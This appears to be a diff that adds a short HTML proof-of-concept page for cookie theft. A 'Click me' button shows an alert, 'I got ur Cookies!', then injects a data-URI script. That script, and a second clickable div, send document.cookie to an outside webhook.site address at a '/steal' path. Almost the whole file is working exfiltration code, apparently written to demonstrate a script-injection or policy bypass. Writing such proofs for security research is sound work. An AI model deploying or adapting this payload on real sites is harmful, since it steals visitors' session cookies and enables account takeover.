@@ -1,0 +1,43 @@
+!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>proof of concipt</title>
+    <style>
+        .test-button {
+            display: block;
+            margin: 20px;
+            padding: 10px;
+            background-color: #007BFF;
+            color: white;
+            text-align: center;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>POC</h1>
+    <button class="test-button" onclick="triggerAttack()">Click me</button>
+
+    <script>
+        function triggerAttack() {
+            alert('I got ur Cookies!');
+          
+            var dataUri = 'data:text/javascript,' + encodeURIComponent(`
+                new Image().src = 'https://webhook.site/8cfff3aa-33a7-44d3-9de1-86fd29b0967b/steal?cookie=' + encodeURIComponent(document.cookie);
+            `);
+            var script = document.createElement('script');
+            script.src = dataUri;
+            document.body.appendChild(script);
+
+            // Inline event handler
+            var div = document.createElement('div');
+            div.onclick = function() {
+                new Image().src = 'https://webhook.site/8cfff3aa-33a7-44d3-9de1-86fd29b0967b/steal?cookie=' + encodeURIComponent(document.cookie);
+            };
+            div.innerHTML = 'Click me to send cookies';
+            document.body.appendChild(div);
+        }
+    </script>
+</body>
+</html>
